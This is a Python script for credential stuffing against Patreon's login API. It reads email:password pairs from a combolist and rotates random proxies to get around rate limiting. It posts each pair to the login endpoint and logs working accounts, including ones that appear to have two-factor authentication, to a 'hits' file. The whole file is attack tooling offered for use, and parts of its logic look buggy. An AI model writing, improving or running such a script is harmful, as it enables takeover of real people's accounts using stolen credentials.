# -*- coding: utf8 -*-
from itertools import islice
import requests
import random
x = int(0)
run = int(0)
Run = True
e = int(0)
listname = input("What is the name of the Combolist (for example DB.txt")
pfilenam = input(str("Input the proxy file name (file must be in the same directory as the script and include .txt for example Proxylist.txt):"))

def Request():
    global x
    global run
    global e
    Leg = True
    passlist = open(listname, "r", encoding="utf8")
    for line in islice(passlist, e, None):
        ltemp = passlist.readline()
        passlist.close()
        break
    with open(pfilenam) as f:
        linez = [line.rstrip('\n') for line in f]
    rnd_line = random.choice(linez)
    o = str(rnd_line)
    ip1, port1 = o.split(":")
    e = e + 1
    url = "https://www.patreon.com/api/login?include=campaign%2Cuser_location&json-api-version=1.0"
    email = ltemp.partition(":")[0]
    password = ltemp.partition(":")[2]
    password = password.rstrip()
    GOLD1 = email
    GOLD2 = password
    p1 = "{\"data\":{\"type\":\"user\",\"attributes\":{\"email\":\""
    p2 = "\",\"password\":\""
    p3 = "\"},\"relationships\":{}},\"meta\":{\"redirect_target\":\"/m/2211846/posts\"}}"
    demo = p1 + email +p2 + password + p3
    payload = demo
    proxies = {
        "https": "http://{}:{}".format(ip1, port1)
    }
    print(proxies)
    headers = {
        'authority': 'www.patreon.com',
        'accept': '*/*',
        'sec-gpc': '1',
        'origin': 'https://www.patreon.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'Content-Type': 'text/plain',
        'Cookie': ''
    }

    try:
        response = requests.request("POST", url, headers=headers, data=payload, proxies=proxies)
    except:
        return

    if response.status_code == 400:
        fllresponse = 1
    elif  response.status_code == 429:
        print("your proxy is being rate limited add more proxys")
        fllresponse = ""
    elif response.status_code == 401:
        fllresponse = 2
    else:
        fllresponse = ""
    run = run + 1
    return fllresponse, run, GOLD1, GOLD2

def PostRequest(fllreponse, run, GOLD1, GOLD2):
    if fllresponse == 1:
        print("Account Accessed and written to file")
        accounts = open("hits.txt", "a")
        accounts.write("HIT ON LINE {} EMAIL: {} PASSWORD: {}\n".format(x, GOLD1, GOLD2))
        accounts.close()
    elif fllresponse == 2:
        print("Account Creds correct however 2FA appears to be enabled")
        accounts = open("hits.txt", "a")
        accounts.write("HIT ON LINE(!!!Potential 2FA!!!) EMAIL: {} PASSWORD: {}\n".format(GOLD1, GOLD2))
        accounts.close()
    else:
        print("Running tried {} combos so far".format(run))
while Run == True:
     try:
         fllresponse, run, GOLD1, GOLD2 = Request()
     except:
         Request()
     PostRequest(fllresponse, run, GOLD1, GOLD2)
